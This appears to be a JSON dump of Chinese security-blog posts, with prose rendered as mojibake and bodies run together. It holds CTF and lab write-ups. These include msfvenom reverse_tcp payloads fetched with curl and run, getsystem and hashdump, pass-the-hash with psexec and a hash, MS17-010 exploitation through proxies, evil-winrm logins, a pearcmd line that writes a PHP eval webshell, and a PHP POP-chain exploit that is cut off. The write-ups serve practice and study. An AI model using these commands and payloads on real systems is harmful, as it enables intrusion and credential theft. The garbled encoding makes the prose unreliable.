01001100110111111110010000111100000111111111111100011110000001001100110111111110010000111100000110011100001100111111111000110000001111100110001111000000000110011100001100111111111000110000001111100110001111000000111110011111110011011001100000001111111000011111111111001100111110011111110011011001100000001111111000011111111111001100000000000000001111000001111001110000001110011000001100110000000000000000001111000001111001110000001110011000001100110000111111111111000011011000011111110000001000011001101100110000111111111111000011011000011111110000001000011001101100110000100000000011000000000000011000001111111000011000001100001100100111111011001100111000000110000011110000011111111111111111100111111011001100111000000110000011110000011111111111111111100111111011000011100111111110111111000001111111100000111100100111111011000011100111111110111111000001111111100000111100100111111011000011111111111111000011001001100111101111110000100111111011000011111111111111000011001001100111101111110000100000000011001100100000011111000011111001111000011100000000100000000011001100100000011111000011111001111000011100000000111111111111000000000111100001000000111111111000010000000011111111111111000000000111100001000000111111111000010000000011 å› ä¸ºåªæœ‰01ï¼Œå¹¶ä¸”è¦æ”¹å˜æ–‡ä»¶æ ¼å¼ï¼Œè¿™é‡Œè¿˜æ˜¯è€ƒè™‘è½¬æ¢æˆäºŒç»´ç çš„å½¢å¼\nå­—ç¬¦ä¸²çš„é•¿åº¦æ€»å…±æ˜¯3600ï¼Œå¯ä»¥å°†å®½é«˜è®¾ç½®ä¸º60Ã—60\nfrom PIL import Image\rWIDTH = 60\rHEIGHT = 60 pic = Image.new(\u0026#34;RGB\u0026#34;, (WIDTH, HEIGHT))\rstr = \u0026#34;111111111111000011100111111111111100000111111001111111111111100000000011000000111001100001110011000110011001100000000011100000000011000000111001100001110011000110011001100000000011100111111011001100000110000111000011111000000001101111110011100111111011001100000110000111000011111000000001101111110011100111111011000011111000011001111100110111111001101111110011100111111011000011111000011001111100110111111001101111110011100111111011001100111000011001001111111111111001101111110011100111111011001100111000011001001111111111111001101111110011100000000011001100100001111001111111000000000001100000000011111111111111001100100110011001001100110110011001111111111111111111111111001100100110011001001100110110011001111111111111000000000000000011000111100000111100001000000000000000000000000000000000000011000111100000111100001000000000000000000000011000011011001100011000000110110011001110011110011100110000011000011011001100011000000110110011001110011110011100110000011000011100001111011111100111001100110001100110010000110000011000011100001111011111100111001100110001100110010000110000111000011011110000011111100000110000000111100000000000110000100001100000000000000001100110111100111111100110010000000000100001100000000000000001100110111100111111100110010000000000000001100111001100111001100111001111111110000001111111110011000001100111001100111001100111001111111110000001111111110011011001100000111100111110011000000011000001111110000000110011011001100000111100111110011000000011000001111110000000110011100000011111001100011110000000110011000001100000001100111100100000011111001100011110000000110011000001100000001100111100111000000000110011100111111001000011111110000110011111000011111000000000110011100111111001000011111110000110011111000011100000011111001111100000000000111100001110000111111111000000111110000100110000111000011111001100110001111000010000110000111110000100110000111000011111001100110001111000010000110000000111100011110000111000000111110000001001100000010000110000000111100011110000111000000111110000001001100000010000110000111001111000110000000001111001001100111000011110001100001100111001111000110000000001111001001100111000011110001100001100011000011011110011111110011110000011001110011001101100111111011000011011110011111110011110000011001110011001101100111111111001111000001111100001111110111111110111100110010000111111000111111111111100011110000001001100110111111110010000111100000111111111111100011110000001001100110111111110010000111100000110011100001100111111111000110000001111100110001111000000000110011100001100111111111000110000001111100110001111000000111110011111110011011001100000001111111000011111111111001100111110011111110011011001100000001111111000011111111111001100000000000000001111000001111001110000001110011000001100110000000000000000001111000001111001110000001110011000001100110000111111111111000011011000011111110000001000011001101100110000111111111111000011011000011111110000001000011001101100110000100000000011000000000000011000001111111000011000001100001100100111111011001100111000000110000011110000011111111111111111100111111011001100111000000110000011110000011111111111111111100111111011000011100111111110111111000001111111100000111100100111111011000011100111111110111111000001111111100000111100100111111011000011111111111111000011001001100111101111110000100111111011000011111111111111000011001001100111101111110000100000000011001100100000011111000011111001111000011100000000100000000011001100100000011111000011111001111000011100000000111111111111000000000111100001000000111111111000010000000011111111111111000000000111100001000000111111111000010000000011\u0026#34;\ri = 0\rfor y in range(0, HEIGHT):\rfor x in range(0, WIDTH):\rif (str[i] == \u0026#39;1\u0026#39;):\rpic.putpixel((x, y), (0, 0, 0))\relse:\rpic.putpixel((x, y), (255, 255, 255))\ri += 1\rpic.save(\u0026#34;flag.png\u0026#34;) NSSCTF{a51f0b9fb5fd47ca14332fa1acab352e} ä»åƒå¹´çœŸç†éƒ¨åˆ°æ¸¸æˆå¼€å‘éƒ¨day1 #\rä»€ä¹ˆæ¸¸æˆå«baseå•Šï¼Ÿæˆ‘è¦ç©æ¸¸æˆo(â•¥ï¹â•¥)oï¼Œæ€ä¹ˆç©æ¸¸æˆè¿˜è¦äº†è§£baseç¼–ç ï¼Œå¥½éš¾å•Šï¼Œè‹¦å‘€è¥¿~\nçœ‹ä¼¼æ˜¯Base64åŠ å¯†ï¼Œè§£å¯†å‡ºæ¥å°±æ˜¯ä¸€æ®µæ­Œè¯ï¼Œæ²¡æœ‰å¯†ç çš„ç—•è¿¹\næœç´¢çš„åˆ°Base64ç¼–ç ä¹Ÿæœ‰éšå†™\n[MISC]Base64éšå†™-CSDNåšå®¢ # base64éšå†™\rimport base64\rdef get_diff(s1, s2):\rbase64chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;\rres = 0\rfor i in range(len(s2)):\rif s1[i] != s2[i]:\rreturn abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))\rreturn res\rdef b64_stego_decode():\rfile = open(\u0026#34;game.txt\u0026#34;, \u0026#34;rb\u0026#34;)\rx = \u0026#39;\u0026#39; # xå³bin_str\rlines = file.readlines()\rfor line in lines:\rl = str(line, encoding=\u0026#34;utf-8\u0026#34;)\rstego = l.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;)\r# print(stego)\rrealtext = base64.b64decode(l)\r# print(realtext)\rrealtext = str(base64.b64encode(realtext), encoding=\u0026#34;utf-8\u0026#34;)\r# print(realtext)\rdiff = get_diff(stego, realtext) # diffä¸ºéšå†™å­—ä¸²ä¸å®é™…å­—ä¸²çš„äºŒè¿›åˆ¶å·®å€¼\rn = stego.count(\u0026#39;=\u0026#39;)\rif diff:\rx += bin(diff)[2:].zfill(n * 2)\relse:\rx += \u0026#39;0\u0026#39; * n * 2\ri = 0\rflag = \u0026#39;\u0026#39;\rwhile i \u0026lt; len(x):\rif int(x[i:i + 8], 2):\rflag += chr(int(x[i:i + 8], 2))\ri += 8\rprint(flag)\rif __name__ == \u0026#39;__main__\u0026#39;:\rb64_stego_decode()\r#game,G@mee ä½¿ç”¨å¯†ç ï¼šgame,G@mee\næ¯”è¾ƒæ˜æ˜¾çš„å›¾ç‰‡ç‰¹å¾ï¼Œæ‹¿åˆ°èµ›åšå¨å¸ˆé‡Œé¢\nNSSCTF{The_god_of_the_game_field} ","date":"2024-11-21","externalUrl":null,"permalink":"/posts/2024/11/swpu-misc/","section":"Posts","summary":"","title":"SWPU-Misc","type":"posts"},{"content":"","date":"2024-11-17","externalUrl":null,"permalink":"/categories/engineering-practice/","section":"Categories","summary":"","title":"Engineering-Practice","type":"categories"},{"content":"\rå‰è¨€ #\ræœ¬æ–‡æ˜¯åœ¨æ”»ç ´Windows Server 2016 DCçš„åŸºç¡€ä¸Šå¯¹Windows PC 8089è¿›è¡Œæ”»å‡»\nä¿¡æ¯æ”¶é›† #\rå›åˆ°WinServer 2016 DCçš„Meterpreterä¸Šï¼Œè¿›å…¥shellï¼Œå¦‚æœä½¿ç”¨äº†ä»£ç†å¯¼è‡´è¿›ä¸å»ï¼Œè¯·å‚è€ƒå‰é¢å‡ ç¯‡æ–‡ç« \nè°ƒæ•´å­—ç¬¦é›†ï¼Œè¿™æ ·ä¸ä¼šä¹±ç \nipconfig /all å¯ä»¥å‘ç°å½“å‰ä¸»æœºå­˜åœ¨åŸŸ\nC:\\Windows\\system32\u0026gt;powershell PS C:\\Windows\\system32\u0026gt; Get-ADComputer -Filter * C:\\Windows\\system32\u0026gt; systeminfo å¯ä»¥çœ‹åˆ°è¿™å››å°ä¸»æœºéƒ½åœ¨åŸŸå†…ï¼Œè€Œä¸”åŸŸæ§æ˜¯å½“å‰meterpreterçš„DCä¸»æœº\nå¯¹8098ä¸»æœºè¿›è¡Œç®€å•æ‰«æï¼Œå¼€æ”¾ç«¯å£ï¼š80ï¼Œ135ï¼Œ139ï¼Œ445ï¼Œ3306ï¼Œ7680\nå…¶ä¸­3306ç«¯å£æˆ‘éªŒè¯è¿‡äº†ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æ¼æ´å¯ä»¥åˆ©ç”¨çš„ï¼Œå…¶ä½™ç«¯å£ä¹Ÿæ˜¯ã€‚\nå› ä¸ºå­˜åœ¨135ã€445ç«¯å£ï¼Œå¯ä»¥å°è¯•å†…ç½‘**PTHï¼ˆpass-the-hashï¼‰**æ”»å‡»\nåœ¨DCçš„Meterpreteré‡Œè¿›è¡Œhashdumpï¼Œæ‹¿åˆ°Administratorçš„hash\nåŸŸæ§çš„æƒé™ï¼šåŸŸç®¡ç†å‘˜ï¼ˆDomain Adminsï¼‰ç»„çš„æˆå‘˜å¯ä»¥åœ¨åŸŸå†…çš„ä»»ä½•è®¡ç®—æœºä¸Šç™»å½•\nPTHæ”»å‡» #\rè¿™é‡Œä½¿ç”¨kaliè‡ªå¸¦çš„impacket-psexecå°±è¡Œ\nproxychains impacket-psexec AEROSPACE/Administrator@172.22.10.40 -hashes \u0026#34;aad3b435b51404eeaad3b435b51404ee:4e4b335d557d9c79bc419490672102b2\u0026#34; å¯ä»¥çœ‹åˆ°æˆåŠŸè¿›å…¥åˆ°Shellï¼Œå¦‚æœç¼–ç ä¹±äº†å°±æ‰§è¡Œchcp 65001\nå¹¶ä¸”ç”±äºå…·æœ‰æœ€é«˜æƒé™ï¼Œåœ¨Aliceçš„ç›®å½•ä¸‹æ‹¿åˆ°flag03\n","date":"2024-11-17","externalUrl":null,"permalink":"/posts/2024/11/ep-win8098/","section":"Posts","summary":"","title":"EP-Win8098","type":"posts"},{"content":"\rå‰è¨€ #\rè¿™ä¸ªä¸»æœºæ¯«æ— æ–°æ„ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘éƒ½ä¸æƒ³å†™ï¼Œæ”»ç ´è¿™ä¸ªä¸»æœºçš„æ–¹æ³•å’Œå‰é¢8089æ˜¯ä¸€æ¨¡ä¸€æ ·\nPTHæ”»å‡» #\ræŒ‰é“ç†æ¥è¯´ï¼Œæ‹¿ä¸‹åŸŸæ§çš„Administratorä¹‹åï¼Œæ•´ä¸ªåŸŸåŸºæœ¬ä¸Šå°±å¯ä»¥æ‰“ç©¿äº†ã€‚\nè¿™å°ä¸»æœºä¾æ—§æ˜¯ä½¿ç”¨pass-the-hashæ”»å‡»\nåªéœ€è¦ä¿®æ”¹ä¸€ä¸‹IPå°±èƒ½è¿›å»äº†\nåœ¨Administratorç›®å½•ä¸‹æ‹¿åˆ°flag\næœ¬æ¬¡å·¥ç¨‹å®è·µåˆ°æ­¤ç»“æŸ\n","date":"2024-11-17","externalUrl":null,"permalink":"/posts/2024/11/ep-winserverca/","section":"Posts","summary":"","title":"EP-WinServerCA","type":"posts"},{"content":"","date":"2024-11-17","externalUrl":null,"permalink":"/tags/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/","section":"Tags","summary":"","title":"å·¥ç¨‹å®è·µ","type":"tags"},{"content":"\rå‰è¨€ #\ræœ¬æ–‡æ˜¯åœ¨8086é‚£ç¯‡æ–‡ç« å·²ç»æ­å»ºå¥½ä»£ç†çš„æƒ…å†µä¸‹è¿›è¡Œçš„\næ¼æ´æ‰«æ #\råˆ©ç”¨web01ä¸Šçš„fscanå¯¹DCä¸»æœºè¿›è¡Œæ‰«æï¼Œå‘ç°ç–‘ä¼¼å­˜åœ¨MS17-010æ¼æ´\nè¿›å…¥MSFï¼Œè®¾ç½®å…¨å±€ä»£ç†ä»¥åŠåå‘å…è®¸\nsetg Proxies socks5:127.0.0.1:46075\rset ReverseAllowProxy true é€‰å–æ¢æµ‹æ¨¡å—\nuse auxiliary/scanner/smb/smb_ms17_010\rset rhost 172.22.10.11 å¯ä»¥çœ‹åˆ°æ¢æµ‹æ¨¡å—æ˜¾ç¤ºè¯¥é¶æœºå¥½åƒå­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´\næ¥ä¸‹æ¥è¿›ä¸€æ­¥æ”»å‡»\nMS17-010 #\rsearch ms17-010\ruse 10 æ³¨æ„è¿™é‡Œä¸è¦é€‰å–ç¬¬0ä¸ªæ¨¡å—ï¼Œç»è¿‡æˆ‘çš„å°è¯•ä½¿ç”¨ä»–ä¼šå¯¼è‡´é¶æœºç›´æ¥è“å±\nè¿™é‡Œç”¨ç¬¬10ä¸ª\né…ç½®å¦‚å›¾\nå¯ä»¥çœ‹åˆ°åå¼¹æˆåŠŸï¼Œä¸ç”¨ææƒ\nç›´æ¥å°±èƒ½è¯»å–åˆ°Adminç›®å½•ä¸‹çš„flag\n","date":"2024-11-16","externalUrl":null,"permalink":"/posts/2024/11/ep-winserverdc/","section":"Posts","summary":"","title":"EP-WinServerDC","type":"posts"},{"content":"\rå‰è¨€ #\ræœ¬æ–‡æ˜¯åœ¨å·²ç»æ”»ç ´EP-web01çš„åŸºç¡€ä¸Šï¼Œå¯¹å…¶å†…ç½‘ä¸­çš„Win8086è¿›è¡Œæ”»å‡»ï¼Œæœ€ç»ˆè·å–åˆ°å…¶æƒé™\næ¼æ´æ‰«æ #\rç”±äºä¸Šç¯‡æ–‡ç« å·²ç»å¯ä»¥è¿œç¨‹ç™»å½•Web01ï¼Œè¿™é‡Œç›´æ¥ä¸Šä¼ fscançš„windowsç‰ˆæœ¬ï¼Œå¹¶ä¸”è¿›è¡Œæ¼æ‰«\nè¿™é‡Œè¿˜æ˜¯ä½¿ç”¨httpä¼ è¾“æ–‡ä»¶\n#kalié‡Œé¢\r$ python -m http.server 80\r#win\rPS : curl 192.168.237.140/fscan.exe -O fscan.exe å¥½åƒæ‰«åˆ°ä¸€ä¸ªMS17-010çš„æ¼æ´\nå¯¹36è¿›è¡Œæ‰«æä¹Ÿæ˜¯å‘ç°MS17-010çš„æ¼æ´\næ­å»ºä»£ç† #\rï¼ˆé¢˜å¤–è¯ï¼šä¸ºä»€ä¹ˆæˆ‘è¦ä½¿ç”¨å¤–éƒ¨çš„å·¥å…·å‘¢ï¼Ÿå› ä¸ºmsfè‡ªå¸¦çš„socks_proxyæˆ‘è¿™é‡Œå°è¯•äº†å¥½åƒç”¨ä¸äº†ï¼Œæˆ–è®¸æ˜¯æˆ‘æ“ä½œæœ‰é—®é¢˜ï¼Œä¸è¿‡æœ‰å·¥å…·ç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰\nfrpå†…ç½‘ç©¿é€å·¥å…·\nReleases Â· fatedier/frp (github.com) è¿™é‡Œä½¿ç”¨çš„æ˜¯V6.0çš„ç‰ˆæœ¬ï¼Œåˆ†åˆ«ä¸‹è½½linuxå’Œwindowsç‰ˆæœ¬\n[common]\rbind_port = 7000 [common]\rserver_addr = 192.168.237.140 server_port = 7000 tls_enable = ture [plugin socks]\rtype = tcp plugin = socks5 remote_port = 46075 use_encryption = true\ruse_compression = true å…¶ä¸­windowsçš„frpé…ç½®æ–‡ä»¶ä¸­çš„server_addrå°±æ˜¯kaliçš„IPï¼Œä½¿ç”¨çš„ä»£ç†ç«¯å£å°±æ˜¯46075\nweb01çš„ä¸»æœºä¸Šä»ç„¶ä½¿ç”¨curl -Oçš„æ–¹å¼è¿›è¡Œä¸‹è½½æ–‡ä»¶\næœ€åä¸¤ç«¯å¼€å¯frpæœåŠ¡\nå¦‚å›¾æ‰€ç¤ºï¼Œfrpä»£ç†å¼€å¯æˆåŠŸ\nå›åˆ°Kali\n$ vim /etc/proxychains4.conf åœ¨æœ€ä¸‹ç«¯å¦‚å›¾é…ç½®å³å¯\nMS17-010 #\r$ msfconsole æ‰“å¼€msfconsoleï¼Œå¹¶ä¸”æ‰§è¡Œè¿™ä¸¤è¡Œå‘½ä»¤ï¼Œå°±ä¸ç”¨å†æ‰§è¡Œproxychainsäº†\nsetg Proxies socks5:127.0.0.1:46075 #è®¾ç½®å…¨å±€ä»£ç†\rset ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚ ç„¶åæ­£å¸¸çš„ä½¿ç”¨æ°¸æ’ä¹‹è“çš„æ¼æ´å³å¯\nè¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯æˆ‘ä½¿ç”¨çš„æ˜¯bind_tcpï¼Œè¿™æ˜¯ä¸€ä¸ªæ­£å‘é“¾æ¥ï¼Œå› ä¸ºkalié€šè¿‡ä»£ç†æ˜¯èƒ½è®¿é—®åˆ°8086ä¸»æœºï¼Œè€Œåè¿‡æ¥æ˜¯ä¸è¡Œçš„ã€‚\nå¯ä»¥çœ‹åˆ°å·²ç»æ˜¯æœ€é«˜æƒé™äº†\nåœ¨Cç›˜çš„Usersçš„Johnç”¨æˆ·ç›®å½•ä¸‹æ‹¿åˆ°ç¬¬äºŒä¸ªflag\nè¿›å…¥Shellï¼Œä¿®æ”¹å­—ç¬¦é›†ä¸º65001ï¼Œä¸ç„¶ä¼šä¹±ç \nå…¶ä»–çš„ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿äº†ï¼Œè¿™ä¸ªé¶æœºåº”è¯¥ä¹Ÿå°±è¿™æ ·äº†\n","date":"2024-11-15","externalUrl":null,"permalink":"/posts/2024/11/ep-win8086/","section":"Posts","summary":"","title":"EP-Win8086","type":"posts"},{"content":"\rå‰è¨€ #\rè¯¥é¶æœºæ˜¯ç›®æ ‡å±€åŸŸç½‘å†…çš„å…¥å£æœºå™¨ï¼Œæœ¬æ–‡ç›®çš„æ˜¯æ‹¿åˆ°Web01çš„æœ€é«˜æƒé™å¹¶ä¸”å®ç°è¿œç¨‹ç™»å½•\nä¿¡æ¯æ”¶é›† #\r$ arp-scan -l å‘ç°å­˜åœ¨ä¸€å°IPå€¼ä¸ºï¼š192.168.237.139çš„ä¸»æœº\n$ namp 192.168.237.139 ç®€å•æ‰«æå‘ç°å¼€æ”¾ç«¯å£ï¼š21ã€80ã€1433ï¼Œå…¶ä¸­å­˜åœ¨mssqlæœåŠ¡\nä½¿ç”¨Fscanè¿›è¡Œæ‰«æï¼šReleases Â· shadow1ng/fscan (github.com)\n$ ./fscan -h 192.168.237.139 å‘ç°ftpæœåŠ¡å­˜åœ¨åŒ¿åè®¿é—®ï¼Œä¸è¿‡æ²¡æœ‰ä»»ä½•æ³„éœ²\nmssqlæœåŠ¡å­˜åœ¨å¼±å£ä»¤\nåå¼¹SHELL #\rä¸‹è½½mssqlå‘½ä»¤æ‰§è¡Œå·¥å…·ï¼šRelease mssql-command-tools Â· Mayter/mssql-command-tool\nå¹¶ä¸”ç”Ÿæˆpowershellçš„åå¼¹å‘½ä»¤ï¼šHYHçš„åå¼¹Shellç”Ÿæˆå™¨\nncç›‘å¬ç«¯å£\nå¹¶ä¸”æ‰§è¡Œå‘½ä»¤\næˆåŠŸå¾—åˆ°powershellçš„åå¼¹\næƒé™æå‡ #\rå½“å‰ç”¨æˆ·æƒé™ä¸ºæ™®é€šç”¨æˆ·\nç”Ÿæˆmsfåå¼¹æœ¨é©¬\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.237.140 LPORT=6666 -f exe -o reverse.exe å¹¶ä¸”å¼€æ”¾httpæœåŠ¡ï¼Œè®©ç›®æ ‡æœºå™¨ä¸‹è½½\n#kali\r$ python -m http.server 80\r#PS\rPS: curl 192.168.237.140/reverse.exe -O shell.exe å†å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œæ‰“å¼€msfconsole\n$ msfconsole è®¾ç½®ç›‘å¬å™¨handlerï¼Œå¹¶é…ç½®\nmsf6 \u0026gt; use exploit/multi/handler msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter/reverse_tcp\rmsf6 exploit(multi/handler) \u0026gt; set lhost 192.168.237.140\rmsf6 exploit(multi/handler) \u0026gt; set lport 6666\rmsf6 exploit(multi/handler) \u0026gt; run å›åˆ°powershellé‚£é‡Œè¿è¡Œexeæ–‡ä»¶\nå¯ä»¥çœ‹åˆ°æˆåŠŸè¿›å…¥meterpreter\næ‰§è¡Œgetsystemè¿›è¡Œæƒé™æå‡ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°æå‡åˆ°äº†systemæœ€é«˜æƒé™\nmeterpreter \u0026gt; getsystem è¿›å…¥administratorçš„ç›®å½•ä¸‹ï¼Œæ‹¿åˆ°flag\nè·å–å¯†ç  #\r$meterpreter \u0026gt; hashdump è·å–åˆ°ç”¨æˆ·å¯†ç hashå€¼ï¼Œè¿™é‡Œåªè¦Administratorçš„å…‰æ ‡éƒ¨åˆ†ï¼Œæ˜¯ç”±md5è¿›è¡ŒåŠ å¯†çš„\nå°†å…¶æ”¾å…¥è§£å¯†ç½‘ç«™ï¼šMD5å…è´¹åœ¨çº¿è§£å¯†ç ´è§£_MD5åœ¨çº¿åŠ å¯†-SOMD5\næˆåŠŸå¾—åˆ°å¯†ç \nè¿œç¨‹ç™»å½• #\rç”±äºåœ¨çœŸå®çš„æ¸—é€æµ‹è¯•ç¯å¢ƒä¸‹æ˜¯æ— æ³•ç›´æ¥æ¥è§¦åˆ°ç›®æ ‡æœºå™¨çš„ï¼Œæ‰€ä»¥è¦æ‰¾åˆ°è¿œç¨‹ç™»å½•çš„åŠæ³•\nè¿›è¡Œnmapå…¨ç«¯å£æ‰«æ\n$ nmap 192.168.237.139 -p- å‘ç°å­˜åœ¨5985ç«¯å£ï¼Œè¯¥ç«¯å£ç”¨äºWindowsçš„è¿œç¨‹ç®¡ç†\nevil-winrmæ˜¯ä¸€ä¸ªå¯ç”¨äºé»‘å®¢æ”»å‡»/æ¸—é€æµ‹è¯•çš„Windowsè¿œç¨‹ç®¡ç†(WinRM)Shell\nç”±äºçŸ¥é“äº†ç®¡ç†å‘˜çš„å¯†ç å¯ä»¥ç›´æ¥ç™»å½•\n$ evil-winrm -i 192.168.237.139 -u Administrator -p \u0026#39;xxxx\u0026#39; ç™»å½•æˆåŠŸ\n","date":"2024-11-12","externalUrl":null,"permalink":"/posts/2024/11/ep-web01/","section":"Posts","summary":"","title":"EP-Web01","type":"posts"},{"content":"","date":"2024-10-31","externalUrl":null,"permalink":"/tags/geekchallenge/","section":"Tags","summary":"","title":"Geekchallenge","type":"tags"},{"content":"\r100%çš„âšª #\rF12å®¡è®¡æºç \nBase64è§£å¯†\nbaby_upload #\r%00æˆªæ–­ï¼Œå±äºnginxè§£æé—®é¢˜ï¼Œä¼šæŠŠfile.extå½“ä½œphpæ–‡ä»¶è§£æ\nez_http #\rrce_me #\rif (!is_array($_POST[\u0026#34;start\u0026#34;])) {\rif (!preg_match(\u0026#34;/start.*now/is\u0026#34;, $_POST[\u0026#34;start\u0026#34;])) {\rif (strpos($_POST[\u0026#34;start\u0026#34;], \u0026#34;start now\u0026#34;) === false) {\rdie(\u0026#34;Well, you haven\u0026#39;t started.\u0026lt;br\u0026gt;\u0026#34;);\r}\r}\r} postï¼šstart=start now\nif (\rsha1((string) $_POST[\u0026#34;__2024.geekchallenge.ctf\u0026#34;]) == md5(\u0026#34;Geekchallenge2024_bmKtL\u0026#34;) \u0026amp;\u0026amp;\r(string) $_POST[\u0026#34;__2024.geekchallenge.ctf\u0026#34;] != \u0026#34;Geekchallenge2024_bmKtL\u0026#34; \u0026amp;\u0026amp;\ris_numeric(intval($_POST[\u0026#34;__2024.geekchallenge.ctf\u0026#34;]))\r)\r# md5(\u0026#34;Geekchallenge2024_bmKtL\u0026#34;)= 0e073277003087724660601042042394\r# sha1(10932435112)= 0e07766915004133176347055865026311692244 å¼±æ¯”è¾ƒï¼Œä½¿ç”¨0eç§‘å­¦è®¡æ•°æ³•\nphpä¸‹åˆ’çº¿trickï¼šBypassï¼šURLéæ³•å‚æ•°åäº§ç”Ÿçš„ç»•è¿‡é—®é¢˜ - Icfh - åšå®¢å›­ (cnblogs.com)\npostï¼š_[2024.geekchallenge.ctf=10932435112\nforeach ($_GET as $key =\u0026gt; $value) {\r$$key = $value;\r} æ¥æ”¶ä»»æ„GETå‚æ•°å¹¶ä¸”è½¬ä¸ºå˜é‡\nif (intval($year) \u0026lt; 2024 \u0026amp;\u0026amp; intval($year + 1) \u0026gt; 2025) {\recho \u0026#34;Well, I know the year is 2024\u0026lt;br\u0026gt;\u0026#34;;\rif (preg_match(\u0026#34;/.+?rce/ism\u0026#34;, $purpose)) {\rdie(\u0026#34;nonono\u0026#34;);\r}\rif (stripos($purpose, \u0026#34;rce\u0026#34;) === false) {\rdie(\u0026#34;nonononono\u0026#34;);\r}\recho \u0026#34;Get the flag now!\u0026lt;br\u0026gt;\u0026#34;;\reval($GLOBALS[\u0026#39;code\u0026#39;]);\r} intvalç»•è¿‡ï¼Œyear=10e10\næ­£åˆ™ç›´æ¥ä¼ å…¥purpose=rceå³å¯\nez_include #\rç›¸å…³æ–‡ç« ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ä¸‰é“é¢˜_php require once ç»•è¿‡-CSDNåšå®¢\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php \u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rif (isset($_GET [\u0026#34;syc\u0026#34;])){\r$file = $_GET [\u0026#34;syc\u0026#34;];\r$hint = \u0026#34;register_argc_argv = On\u0026#34;;\rif (preg_match(\u0026#34;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i\u0026#34;, $file)) {\rdie(\u0026#34;hintéƒ½ç»™çš„è¿™ä¹ˆæ˜æ˜¾äº†è¿˜ä¸ä¼šåš?\u0026#34;);\r}\rif(substr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], -4) === \u0026#39;.php\u0026#39;){\rinclude $file;\r}\r} register_argc_argv æ‰“å¼€ï¼Œå¯ä»¥ä½¿ç”¨pearcmdè¿›è¡Œå†™å…¥æœ¨é©¬\nç›¸å…³æ–‡ç« ï¼šåˆ©ç”¨ pearcmd ä» LFI åˆ° getshell (furina.org.cn)\n/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php\u0026amp;+config-create+/\u0026lt;?=@eval($_POST[\u0026#39;shell\u0026#39;]);?\u0026gt;+/var/www/html/shell.php ä¸€å®šè¦æŠ“åŒ…æŠŠè¢«è½¬ä¹‰çš„å­—ç¬¦æ”¹å›æ¥\nCan_you_Pass_Me #\rSSTIå·¥å…·ï¼šMarven11/Fenjing: ä¸“ä¸ºCTFè®¾è®¡çš„Jinja2 SSTIå…¨è‡ªåŠ¨ç»•WAFè„šæœ¬ | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF (github.com)\nç¨ç­‰ä¸€ä¼šç»•è¿‡\nProblem_On_My_Web #\rä¼ å…¥éæ³•urlæŠ¥é”™çœ‹åˆ°æºç \nå†å†™ä¸€ä¸ªalert(document.cookie)è¿›å»ç„¶åå¤šç‚¹å‡ ä¸‹å°±è¡Œäº†\nSecretInDrivingSchool #\ræºç æ³„éœ²\nç›´æ¥çˆ†ç ´å°±å¯ä»¥äº†ï¼Œå¯†ç æ˜¯ï¼šSYC@chengxingï¼Œä¸å˜çš„\nezpop #\r\u0026lt;?php\rClass lover{\rpublic $J1rry=\u0026#34;data://text/plain,Welcome GeekChallenge 2024\u0026#34;;\rpublic $meimeng=12312313;\rpublic function __destruct(){\rif(isset($this-\u0026gt;J1rry)\u0026amp;\u0026amp;file_get_contents($this-\u0026gt;J1rry)==\u0026#39;Welcome GeekChallenge 2024\u0026#39;){\r$this-\u0026gt;meimeng-\u0026gt;source;\r}\r}\rpublic function __invoke()\r{\recho $this-\u0026gt;meimeng;\r}\r}\rClass Geek{\rpublic $GSBP;\rpublic function __get($name){\r$Challenge = $this-\u0026gt;GSBP;\rreturn $Challenge();\r}\rpublic function __toString(){\r$this-\u0026gt;GSBP-\u0026gt;Getflag();\rreturn \u0026#34;\u0026#34;;\r}\r}\rClass SYC{\rpublic $starven=\u0026#34;php://filter/write=string.strip_tags/?\u0026gt;php_value auto_prepend_file /flag\\n#/resource=.htaccess\u0026#34; ;\r}\r$lover1 = new lover();\r$lover2 = new lover();\r$syc=new SYC();\r$geek1=new Geek();\r$geek1-\u0026gt;GSBP=$lover2;\r$geek2=new Geek();\r$lover1-\u0026gt;meimeng=$geek1;\r$lover2-\u0026gt;meimeng=$geek2;\r$geek2-\u0026gt;GSBP=$syc;\r$s=serialize($lover1);\r$s = preg_replace(\u0026#39;/s:7:\u0026#34;m/\u0026#39;, \u0026#39;S:7:\u0026#34;\\\\\\6d\u0026#39;, $s);\recho 